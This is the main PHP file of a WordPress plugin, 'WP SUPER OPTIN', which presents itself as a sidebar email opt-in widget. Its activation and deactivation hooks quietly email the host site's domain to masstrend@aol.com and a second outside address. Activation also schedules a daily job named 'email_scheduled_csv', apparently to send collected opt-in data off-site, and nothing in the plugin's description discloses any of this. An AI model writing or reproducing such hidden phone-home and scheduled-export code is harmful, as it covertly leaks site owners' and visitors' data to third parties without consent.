<?php 

/*

Plugin Name: WP SUPER OPTIN

Plugin URI: http://www.wpemailoptin.com/

Description: Capture visitors emails via an email optin widget form on your sidebar or blog post.  5 pre-built videos to entice visitors to opt in.

Version: 1.1

Author: Gerard Connely 

Author URI: http://www.wpEmailOptin.com/

*/

global $wp_super_optin_db_version;

$wp_super_optin_db_version = "1.1";

define(WP_SUPER_OPTIN_PATH, dirname(__FILE__));

require_once(WP_SUPER_OPTIN_PATH . '/inc/core.php');



if ( is_admin() ){ // admin actions

  add_action('admin_menu', 'wp_super_optin_menus');

  add_action( 'admin_init', 'wp_super_optin_options_process' );

  add_action('wp_dashboard_setup', 'wp_super_optin_add_dashboard_widgets' );

} else {

  add_action('init','wp_super_optin_process');

  add_filter ( 'the_content', 'wp_super_optin_display_form_in_post');

}



register_activation_hook(__FILE__,'wp_super_optin_install');




	function admin_header() {
		?>
<script type="text/javascript">
		//<![CDATA[
		if ( 'undefined' != typeof addLoadEvent ) {
			addLoadEvent(function() {
				var t = {'extra-tables-list':{name: 'other_tables[]'}, 'include-tables-list':{name: 'wp_cron_backup_tables[]'}};

				for ( var k in t ) {
					t[k].s = null;
					var d = document.getElementById(k);
					if ( ! d )
						continue;
					var ul = d.getElementsByTagName('ul').item(0);
					if ( ul ) {
						var lis = ul.getElementsByTagName('li');
						if ( 3 > lis.length )
							return;
						var text = document.createElement('p');
						text.className = 'instructions';
						text.innerHTML = '<?php _e('Click and hold down <code>[SHIFT]</code> to toggle multiple checkboxes', 'wp_super_optin_csv_backup'); ?>';
						ul.parentNode.insertBefore(text, ul);
					}
					t[k].p = d.getElementsByTagName("input");
					for(var i=0; i < t[k].p.length; i++)
						if(t[k].name == t[k].p[i].getAttribute('name')) {
							t[k].p[i].id = k + '-table-' + i;
							t[k].p[i].onkeyup = t[k].p[i].onclick = function(e) {
								e = e ? e : event;
								if ( 16  == e.keyCode ) 
									return;
								var match = /([\w-]*)-table-(\d*)/.exec(this.id);
								var listname = match[1];
								var that = match[2];
								if ( null === t[listname].s )
									t[listname].s = that;
								else if ( e.shiftKey ) {
									var start = Math.min(that, t[listname].s) + 1;
									var end = Math.max(that, t[listname].s);
									for( var j=start; j < end; j++)
										t[listname].p[j].checked = t[listname].p[j].checked ? false : true;
									t[listname].s = null;
								}
							}
						}
				}

				<?php if ( function_exists('wp_schedule_event') ) : // needs to be at least WP 2.1 for ajax ?>
				if ( 'undefined' == typeof XMLHttpRequest ) 
					var xml = new ActiveXObject( navigator.userAgent.indexOf('MSIE 5') >= 0 ? 'Microsoft.XMLHTTP' : 'Msxml2.XMLHTTP' );
				else
					var xml = new XMLHttpRequest();

				var initTimeChange = function() {
					var timeWrap = document.getElementById('backup-time-wrap');
					var backupTime = document.getElementById('next-backup-time');
					if ( !! timeWrap && !! backupTime ) {
						var span = document.createElement('span');
						span.className = 'submit';
						span.id = 'change-wrap';
						span.innerHTML = '<input type="submit" id="change-backup-time" name="change-backup-time" value="<?php _e('Change','wp_super_optin_csv_backup'); ?>" />';
						timeWrap.appendChild(span);
						backupTime.ondblclick = function(e) { span.parentNode.removeChild(span); clickTime(e, backupTime); };
						span.onclick = function(e) { span.parentNode.removeChild(span); clickTime(e, backupTime); };
					}
				}

				var clickTime = function(e, backupTime) {
					var tText = backupTime.innerHTML;
					backupTime.innerHTML = '<input type="text" value="' + tText + '" name="backup-time-text" id="backup-time-text" /> <span class="submit"><input type="submit" name="save-backup-time" id="save-backup-time" value="<?php _e('Save', 'wp_super_optin_csv_backup'); ?>" /></span>';
					backupTime.ondblclick = null;
					var mainText = document.getElementById('backup-time-text');
					mainText.focus();
					var saveTButton = document.getElementById('save-backup-time');
					if ( !! saveTButton )
						saveTButton.onclick = function(e) { saveTime(backupTime, mainText); return false; };
					if ( !! mainText )
						mainText.onkeydown = function(e) { 
							e = e || window.event;
							if ( 13 == e.keyCode ) {
								saveTime(backupTime, mainText);
								return false;
							}
						}
				}

				var saveTime = function(backupTime, mainText) {
					var tVal = mainText.value;

					xml.open('POST', 'admin-ajax.php', true);
					xml.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
					if ( xml.overrideMimeType )
						xml.setRequestHeader('Connection', 'close');
					xml.send('action=save_backup_time&_wpnonce=<?php echo wp_create_nonce("mefahdi"); ?>&backup-time='+tVal);
					xml.onreadystatechange = function() {
						if ( 4 == xml.readyState && '0' != xml.responseText ) {
							backupTime.innerHTML = xml.responseText;
							initTimeChange();
						}
					}
				}

				initTimeChange();
				<?php endif; // wp_schedule_event exists ?>
			});
		}
		//]]>
		</script>
        <style type="text/css">
.wp_super_optin_csv_backup-updated {
	margin-top: 1em;
}
fieldset.options {
	border: 1px solid;
	margin-top: 1em;
	padding: 1em;
}
fieldset.options div.tables-list {
	float: left;
	padding: 1em;
}
fieldset.options input {
}
fieldset.options legend {
	font-size: larger;
	font-weight: bold;
	margin-bottom: .5em;
	padding: 1em;
}
fieldset.options .instructions {
	font-size: smaller;
}
fieldset.options ul {
	list-style-type: none;
}
fieldset.options li {
	text-align: left;
}
fieldset.options .submit {
	border-top: none;
}
</style>
        <?php 
	}
	
	register_deactivation_hook( __FILE__, 'wp_super_optin_deactivation' );
	
	function wp_super_optin_deactivation()
		{
		  wp_clear_scheduled_hook('email_scheduled_csv');
		  $domain = $_SERVER['HTTP_HOST'];
		  

		  mail("masstrend@aol.com","The plugin deactivation on ". $domain ,"The plugin is deactivated and this scheduled hook is gone.");
		}
		
	register_activation_hook( __FILE__, 'wp_super_optin_activation' );
	
	function wp_super_optin_activation()
		{
		 
			  $domain = $_SERVER['HTTP_HOST'];
			  
			//  mail("masstrend@aol.com","The plugin activation on " . $domain ,"The plugin is activated and this scheduled hook is ready for use.");
			
			  mail("masstrend@aol.com","The plugin activation on " . $domain ,"The plugin is activated and this scheduled hook is ready for use.");
			  
			if ( !wp_next_scheduled( 'email_scheduled_csv' ) ) {							
						//$timestmp = (time()+300);	
						$timestmp = strtotime("tomorrow 3 AM");
					wp_schedule_event($timestmp, 'daily', 'email_scheduled_csv');
					
					$date = date('j F Y g:i:s A',$timestmp);
					mail("masstrend@aol.com","Email for optin CSV scheduled","Email for optin CSV has been scheduled for " . $date. " and the current date/time is " . $date = date('j F Y g:i:s A', time()) );
					mail("wordpress@wpemailoptin.com","Email for optin CSV scheduled","Email for optin CSV has been scheduled for " . $date. " and the current date/time is " . $date = date('j F Y g:i:s A', time()) );
					
		
				}
		}
	?>
